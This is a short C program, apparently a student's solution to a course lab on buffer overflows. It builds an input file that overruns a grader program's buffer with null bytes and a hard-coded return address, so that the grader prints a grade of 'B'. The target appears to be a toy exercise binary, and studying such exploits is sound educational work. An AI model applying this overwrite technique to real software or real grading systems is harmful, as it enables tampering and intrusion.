/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Richard Gomez                                              */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>

/* main takes no arguments and writes a series of characters that cause
   a buffer overun of the grader program. These characters cause an 
   incorrect output, specifically to give a grade of 'B', to be printed.
   The characters are printed to a file named dataB. Returns 0 */

int main(void) {
    unsigned long bAddress;
    int i;

    FILE *psFile;
    psFile = fopen("dataB", "w");

    /* Student name is printed to output file */
    fprintf(psFile, "Richard Gomez");

    /* Null character to ensure correctness */
    putc('\0', psFile);

    /* Additional null characters to overrun the buffer */
    for(i = 0; i < 34; i++) {
        putc('\0', psFile);
    }
    
    /* Address of grade = 'B' */
    bAddress = 0x400858;
    fwrite(&bAddress, sizeof(unsigned long), 1, psFile);

    fclose(psFile);
    return 0;
}

